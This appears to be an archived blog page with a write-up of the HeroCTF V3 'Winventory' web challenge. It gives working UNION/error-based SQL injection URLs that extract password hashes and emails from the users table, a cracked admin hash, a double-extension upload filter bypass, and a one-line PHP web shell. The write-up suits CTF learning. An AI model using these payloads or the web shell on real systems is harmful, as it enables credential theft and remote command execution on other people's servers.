@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='TLDR :  Find and exploit SQL Injection (Union Based &amp;amp; Error Based) Bypass filters on admin pannel in order to upload your PHP reverse shell  Discover the website When we arrive on the site we come across this classic login page
+After a few attempts to search for classic vulnerabilities (ServerSide Template Injection,SQLi,etc&amp;hellip;) which did not yield anything, I create an account and log in to discover the rest of the site.'>
+<title>HeroCTF V3 - Winventory</title>
+
+<link rel='canonical' href='https://endeavxor.github.io/p/heroctf-v3-winventory/'>
+
+<link rel="stylesheet" href="/scss/style.min.72bf3b6b8742f1a19f075cb2a505ab7a2e10e70d35ecfd60574c046ccb51702a.css"><meta property='og:title' content='HeroCTF V3 - Winventory'>
+<meta property='og:description' content='TLDR :  Find and exploit SQL Injection (Union Based &amp;amp; Error Based) Bypass filters on admin pannel in order to upload your PHP reverse shell  Discover the website When we arrive on the site we come across this classic login page
+After a few attempts to search for classic vulnerabilities (ServerSide Template Injection,SQLi,etc&amp;hellip;) which did not yield anything, I create an account and log in to discover the rest of the site.'>
+<meta property='og:url' content='https://endeavxor.github.io/p/heroctf-v3-winventory/'>
+<meta property='og:site_name' content='Endeavxor'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2021-04-26T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-04-26T00:00:00&#43;00:00'/><meta property='og:image' content='https://endeavxor.github.io/p/heroctf-v3-winventory/cover.jpg' />
+<meta name="twitter:title" content="HeroCTF V3 - Winventory">
+<meta name="twitter:description" content="TLDR :  Find and exploit SQL Injection (Union Based &amp;amp; Error Based) Bypass filters on admin pannel in order to upload your PHP reverse shell  Discover the website When we arrive on the site we come across this classic login page
+After a few attempts to search for classic vulnerabilities (ServerSide Template Injection,SQLi,etc&amp;hellip;) which did not yield anything, I create an account and log in to discover the rest of the site."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://endeavxor.github.io/p/heroctf-v3-winventory/cover.jpg' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Afficher le menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu2c93562a3964b7563d41933edfb30080_39192_300x0_resize_box_2.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🔥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Endeavxor</a></h1>
+            <h2 class="site-description">Computer Science &amp; Infosec</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Endeavxor'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/Endeavxor'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Mode sombre</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/heroctf-v3-winventory/">
+                <img src="/p/heroctf-v3-winventory/cover_hu0767c118ba10ca67569e79c8dd3099ad_612104_800x0_resize_q75_box.jpg"
+                        srcset="/p/heroctf-v3-winventory/cover_hu0767c118ba10ca67569e79c8dd3099ad_612104_800x0_resize_q75_box.jpg 800w, /p/heroctf-v3-winventory/cover_hu0767c118ba10ca67569e79c8dd3099ad_612104_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="450" 
+                        loading="lazy"
+                        alt="Featured image of post HeroCTF V3 - Winventory" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+            <a href="/categories/web/" >
+                Web
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/heroctf-v3-winventory/">HeroCTF V3 - Winventory</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Apr 26, 2021</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    3 minutes de lecture
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p><img src="/p/heroctf-v3-winventory/challenge.png"
+	width="494"
+	height="769"
+	srcset="/p/heroctf-v3-winventory/challenge_huc373e848c8b5c759ac27c12a2a86eee2_71265_480x0_resize_box_2.png 480w, /p/heroctf-v3-winventory/challenge_huc373e848c8b5c759ac27c12a2a86eee2_71265_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="64"
+		data-flex-basis="154px"
+	
+></p>
+<h1 id="tldr-">TLDR :</h1>
+<ul>
+<li>Find and exploit SQL Injection (Union Based &amp; Error Based)</li>
+<li>Bypass filters on admin pannel in order to upload your PHP reverse shell</li>
+</ul>
+<h1 id="discover-the-website">Discover the website</h1>
+<p>When we arrive on the site we come across this classic login page</p>
+<p><img src="/p/heroctf-v3-winventory/login.png"
+	width="977"
+	height="532"
+	srcset="/p/heroctf-v3-winventory/login_hua6b33008158c022b47759ef511c520c3_35343_480x0_resize_box_2.png 480w, /p/heroctf-v3-winventory/login_hua6b33008158c022b47759ef511c520c3_35343_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="183"
+		data-flex-basis="440px"
+	
+></p>
+<p>After a few attempts to search for classic vulnerabilities (ServerSide Template Injection,SQLi,etc&hellip;) which did not yield anything, I create an account and log in to discover the rest of the site. Once connected, you come across a book manager in which you can add books and manage them later.</p>
+<p><img src="/p/heroctf-v3-winventory/mainpage.gif"
+	width="1024"
+	height="440"
+	srcset="/p/heroctf-v3-winventory/mainpage_hue15c8b78780be29af028f7fd48ea13bc_380318_480x0_resize_box.gif 480w, /p/heroctf-v3-winventory/mainpage_hue15c8b78780be29af028f7fd48ea13bc_380318_1024x0_resize_box.gif 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="232"
+		data-flex-basis="558px"
+	
+></p>
+<p>As you can see your library is very empty, so let&rsquo;s add a book to it.</p>
+<!-- raw HTML omitted -->
+<p>Now that we have added a book, we can search for it in the &ldquo;Search&rdquo; tab and manage it. And that&rsquo;s where the interesting things will start &hellip;.</p>
+<h1 id="finding-and-exploiting-sqli">Finding and exploiting SQLi</h1>
+<p><img src="/p/heroctf-v3-winventory/triggerSQLi.gif"
+	width="1024"
+	height="440"
+	srcset="/p/heroctf-v3-winventory/triggerSQLi_hubee4b5f658e63f4a4e2581ca62027061_331688_480x0_resize_box.gif 480w, /p/heroctf-v3-winventory/triggerSQLi_hubee4b5f658e63f4a4e2581ca62027061_331688_1024x0_resize_box.gif 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="232"
+		data-flex-basis="558px"
+	
+></p>
+<p>As you can see, the site retrieves the id in the URL in order to find the book that we want to manage, this is very reminiscent of the possibility of an SQL injection, which is confirmed when the addition of the quotation mark causes the error. The first information is the type of database which is MySQL(=MariaDB). As a first approach I tell myself that if the response to the request sent contains more lines (and therefore several books) they will all be displayed on this page: it will therefore be necessary first to determine the exact number of columns in the table which stores the books so that you can do a UNION query with a dummy entry.</p>
+<p><code>http://chall2.heroctf.fr:8050/?page=manageBook&amp;id=78456 UNION SELECT NULL,NULL,NULL,NULL,NULL -- -</code></p>
+<p><img src="/p/heroctf-v3-winventory/step1.png"
+	width="829"
+	height="373"
+	srcset="/p/heroctf-v3-winventory/step1_hu39c636824ca26c1ebf1cabd8203c432a_23370_480x0_resize_box_2.png 480w, /p/heroctf-v3-winventory/step1_hu39c636824ca26c1ebf1cabd8203c432a_23370_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="222"
+		data-flex-basis="533px"
+	
+></p>
+<p>After some tries by incrementing the number of NULL values &hellip;</p>
+<p><code>http://chall2.heroctf.fr:8050/?page=manageBook&amp;id=78456 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL- --</code></p>
+<p><img src="/p/heroctf-v3-winventory/step2.png"
+	width="851"
+	height="333"
+	srcset="/p/heroctf-v3-winventory/step2_huf21ee9e7a5e3fe175945d084e2bc4d53_19635_480x0_resize_box_2.png 480w, /p/heroctf-v3-winventory/step2_huf21ee9e7a5e3fe175945d084e2bc4d53_19635_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="255"
+		data-flex-basis="613px"
+	
+></p>
+<p>There are therefore 9 columns in the table. The first column should be the id, which is confirmed (and leads to an injection error based) when retrieving the version of MySQL</p>
+<p><code>http://chall2.heroctf.fr:8050/?page=manageBook&amp;id=78456 UNION SELECT @@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL- --</code></p>
+<p><img src="/p/heroctf-v3-winventory/step3.png"
+	width="842"
+	height="345"
+	srcset="/p/heroctf-v3-winventory/step3_hu14c600a294c7f8c747d41f079554f55c_20580_480x0_resize_box_2.png 480w, /p/heroctf-v3-winventory/step3_hu14c600a294c7f8c747d41f079554f55c_20580_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="244"
+		data-flex-basis="585px"
+	
+></p>
+<p>Everything that will be indicated in the first field of our UNION in the url will display an error because the database expects an integer for the ID column, we will therefore be able to extract information including user logins and passwords. Luckily the tables and the names of the columns where the connection information is stored are predictable:</p>
+<p><code>http://chall2.heroctf.fr:8050/?page=manageBook&amp;id=78456 UNION SELECT (SELECT password from users LIMIT 1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -</code></p>
+<p><img src="/p/heroctf-v3-winventory/step4.png"
+	width="828"
+	height="338"
+	srcset="/p/heroctf-v3-winventory/step4_hu0a18a166b530843a88a9a3abd01a07a2_22012_480x0_resize_box_2.png 480w, /p/heroctf-v3-winventory/step4_hu0a18a166b530843a88a9a3abd01a07a2_22012_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="244"
+		data-flex-basis="587px"
+	
+></p>
+<p>A hash password is returned to us (pray that it is from the admin), after a quick search it is an MD5 hash which corresponds to : MD5(urfaceismassive) = 6431468f98f6552c3af0816307f91c06
+Now we need to find the username :</p>
+<p><code>http://chall2.heroctf.fr:8050/?page=manageBook&amp;id=78456 UNION SELECT (SELECT username from users LIMIT 1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -</code></p>
+<p><img src="/p/heroctf-v3-winventory/step5.png"
+	width="829"
+	height="332"
+	srcset="/p/heroctf-v3-winventory/step5_hu3ab914f8c27c85e5747b0e36668fa8c9_20065_480x0_resize_box_2.png 480w, /p/heroctf-v3-winventory/step5_hu3ab914f8c27c85e5747b0e36668fa8c9_20065_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="249"
+		data-flex-basis="599px"
+	
+></p>
+<p>There is apparently no username column, let&rsquo;s test if there is an email column :<br>
+<code>http://chall2.heroctf.fr:8050/?page=manageBook&amp;id=78456 UNION SELECT (SELECT email from users LIMIT 1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -</code></p>
+<p><img src="/p/heroctf-v3-winventory/step6.png"
+	width="827"
+	height="328"
+	srcset="/p/heroctf-v3-winventory/step6_huc1854a86d38172515b44ea461b2ca7c5_18302_480x0_resize_box_2.png 480w, /p/heroctf-v3-winventory/step6_huc1854a86d38172515b44ea461b2ca7c5_18302_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="252"
+		data-flex-basis="605px"
+	
+></p>
+<p>An email is returned : <a href="mailto:admin@adminozor.fr">admin@adminozor.fr</a>. Let&rsquo;s try to connect with these credentials, and &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;. BINGO it works</p>
+<h1 id="go-to-admin-pannel-and-bypass-filters-to-upload-your-own-php-reverse-shell">Go to admin pannel and bypass filters to upload your own PHP reverse shell</h1>
+<p>So we are logged in as admin a tab attracts our attention: &ldquo;Administration&rdquo;</p>
+<p><img src="/p/heroctf-v3-winventory/admin.gif"
+	width="1024"
+	height="407"
+	srcset="/p/heroctf-v3-winventory/admin_hu985ebfac9c0cd23ae8ccc6550bebb9d3_217521_480x0_resize_box.gif 480w, /p/heroctf-v3-winventory/admin_hu985ebfac9c0cd23ae8ccc6550bebb9d3_217521_1024x0_resize_box.gif 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="251"
+		data-flex-basis="603px"
+	
+></p>
+<p>Once on this page, we upload an image.jpg for testing, and it works:</p>
+<p><img src="/p/heroctf-v3-winventory/step7.png"
+	width="821"
+	height="258"
+	srcset="/p/heroctf-v3-winventory/step7_huc1a6cc1668bc51897de5b689b29b601b_29086_480x0_resize_box_2.png 480w, /p/heroctf-v3-winventory/step7_huc1a6cc1668bc51897de5b689b29b601b_29086_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="318"
+		data-flex-basis="763px"
+	
+></p>
+<p>But when we upload an image.php file (our shell) it doesn&rsquo;t work :</p>
+<p><img src="/p/heroctf-v3-winventory/step8.png"
+	width="802"
+	height="244"
+	srcset="/p/heroctf-v3-winventory/step8_hu6211836a38e16d1ddbfdce18f5535e94_27365_480x0_resize_box_2.png 480w, /p/heroctf-v3-winventory/step8_hu6211836a38e16d1ddbfdce18f5535e94_27365_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="328"
+		data-flex-basis="788px"
+	
+></p>
+<p>We will therefore have to bypass these filters, there are several ways and the most classic is adding a double extension to our filename, like this: image.jpg.php (Why would that work? Well it could be that the backend code that handle file upload split file name on the &ldquo;.&rdquo; but only check the second element(the extension of the file) assuming the filenames are only of the form something.extension)</p>
+<p>Our image.jpg.php :</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+  <span class="nx">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>And &hellip;&hellip;&hellip;&hellip;&hellip;.. BINGO it works :</p>
+<p>Now we just have to browse through the server directories and hope to find a dodgy file that might contain the flag, which can be found quickly:</p>
+<p><img src="/p/heroctf-v3-winventory/reverseshell.gif"
+	width="1024"
+	height="377"
+	srcset="/p/heroctf-v3-winventory/reverseshell_hu673c80bf2a928b8a07eee39d174ae755_600668_480x0_resize_box.gif 480w, /p/heroctf-v3-winventory/reverseshell_hu673c80bf2a928b8a07eee39d174ae755_600668_1024x0_resize_box.gif 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="271"
+		data-flex-basis="651px"
+	
+></p>
+<p><strong>FLAG : Hero{sql1_t0_lf1_t0_rc3_b4d_s3cur1ty}</strong></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Contenus liés</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/vsctf-2022-vscaptcha/">
+        
+        
+            <div class="article-image">
+                <img src="/p/vsctf-2022-vscaptcha/cover.8f57b2fb40f3dec4271312c0e2ad871d_hu38fe278006cf35f230a31e53c5b70eba_203359_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post vsCTF 2022 - vsCAPTCHA"
+                        
+                        data-hash="md5-j1ey&#43;0Dz3sQnExLA4q2HHQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">vsCTF 2022 - vsCAPTCHA</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/dctf-2022-bookstore.java/">
+        
+        
+            <div class="article-image">
+                <img src="/p/dctf-2022-bookstore.java/cover.fcf1cd77e146ffcb493cbc811ba094a9_hua098301c826ad8eefb390521eac20c74_299631_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post DCTF 2022 - BookStore.java"
+                        
+                        data-hash="md5-/PHNd&#43;FG/8tJPLyBG6CUqQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">DCTF 2022 - BookStore.java</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/inter-iut-hr-panel-1-2-3/">
+        
+        
+            <div class="article-image">
+                <img src="/p/inter-iut-hr-panel-1-2-3/cover.707c5de47c776550253b9b4720aaa3e2_huc265a5118e6b97a0e7d177e19ea0a1cf_549279_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Inter IUT - HR Panel (1, 2 &amp; 3)"
+                        
+                        data-hash="md5-cHxd5Hx3ZVAlO5tHIKqj4g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Inter IUT - HR Panel (1, 2 &amp; 3)</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/heroctf-v4-deadalus/">
+        
+        
+            <div class="article-image">
+                <img src="/p/heroctf-v4-deadalus/cover.f82aa23a9ce3d56902419b54a6794f43_hu47698ab55ffe6c3832e7d8a5f4b18af2_764019_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HeroCTF V4 - Deadalus"
+                        
+                        data-hash="md5-&#43;CqiOpzj1WkCQZtUpnlPQw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HeroCTF V4 - Deadalus</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2021 - 
+        
+        2022 Endeavxor
+    </section>
+    
+    <section class="powerby">
+        
+            Jamais trop tard pour ouvrir un livre. <br/>
+        Généré avec <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Thème <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> conçu par <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
